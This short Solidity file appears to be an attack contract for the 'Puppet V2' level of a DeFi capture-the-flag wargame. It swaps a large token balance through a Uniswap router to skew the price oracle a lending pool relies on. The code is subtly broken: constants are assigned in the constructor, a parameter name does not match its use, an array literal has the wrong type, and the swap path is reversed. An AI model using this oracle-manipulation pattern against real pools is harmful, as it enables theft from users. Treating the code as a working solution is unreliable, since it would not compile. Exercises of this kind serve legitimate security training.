//SPDX-License-Identifier: MIT

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
}

interface IUniswapRouter {
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
}

contract AttackPuppetV2 {

    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10000 ether; // actually dvt


    IERC20 private constant wrappedEth;
    IERC20 private constant token;
    address private constant player;
    IUniswapRouter private constant router;

    constructor(address _wethAddress, address _tokenAddress, address _router, address player) payable
    {
        wrappedEth = IERC20(_wethAddress);
        token = IERC20(_tokenAddress);
        router = IUniswapRouter(_router);
        player = _player;
    }

    function swap() public {
        router.swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, 1, [address(wrappedEth), address(token)], player, block.timestamp + 5000);

    }

    receive() external payable {}
}
